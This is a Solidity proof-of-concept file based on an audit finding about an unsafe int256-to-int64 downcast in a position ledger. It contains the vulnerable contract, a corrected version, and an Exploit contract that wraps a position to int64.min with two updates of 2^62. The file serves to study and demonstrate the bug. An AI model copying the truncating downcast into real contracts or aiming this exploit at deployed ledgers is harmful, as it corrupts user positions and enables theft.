// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// Ithaca Ledger (Quantstamp). processPositionUpdates downcasts an int256 sum to int64.
// Two updatePositions calls of 2^62 store int64.min instead of +2^63.
// The published simplified Ledger is external and has no caller check.

contract Ledger {
    struct PositionParam {
        uint32 contractId;
        address client;
        int64 size;
    }

    mapping(uint32 => mapping(address => int64)) public clientPositions;

    function updatePositions(PositionParam[] memory positions) external {
        if (positions.length > 0) {
            processPositionUpdates(positions);
        }
    }

    function processPositionUpdates(PositionParam[] memory positions) internal {
        PositionParam memory position;
        for (uint256 i = 0; i < positions.length; i++) {
            position = positions[i];
            clientPositions[position.contractId][position.client] = int64(int256(clientPositions[position.contractId][position.client]) + int256(position.size)); // @> VULN: downcast truncates 2^63 to int64.min
        }
    }
}

contract LedgerFixed {
    struct PositionParam {
        uint32 contractId;
        address client;
        int64 size;
    }

    mapping(uint32 => mapping(address => int256)) public clientPositions;

    function updatePositions(PositionParam[] memory positions) external {
        for (uint256 i = 0; i < positions.length; i++) {
            PositionParam memory position = positions[i];
            clientPositions[position.contractId][position.client] += int256(position.size);
        }
    }
}

contract PositionMarker {
    string public symbol = "FALSE-POS";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address public constant CLIENT = 0x2222222222222222222222222222222222222222;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;
    int64 public constant SIZE = 4611686018427387904; // 2^62
    uint256 public constant FALSE_MAGNITUDE = 9223372036854775808; // abs(int64.min) == 2^63

    Ledger public ledger;
    PositionMarker public marker;

    function run() external payable {
        ledger = new Ledger();
        marker = new PositionMarker();
        Ledger.PositionParam[] memory one = new Ledger.PositionParam[](1);
        one[0] = Ledger.PositionParam({contractId: 1, client: CLIENT, size: SIZE});
        ledger.updatePositions(one);
        int64 mid = ledger.clientPositions(1, CLIENT);
        require(mid == SIZE, "first write");
        ledger.updatePositions(one);
        int64 endPos = ledger.clientPositions(1, CLIENT);
        require(endPos == type(int64).min, "wrapped");
        marker.mint(SINK, FALSE_MAGNITUDE);
    }
}
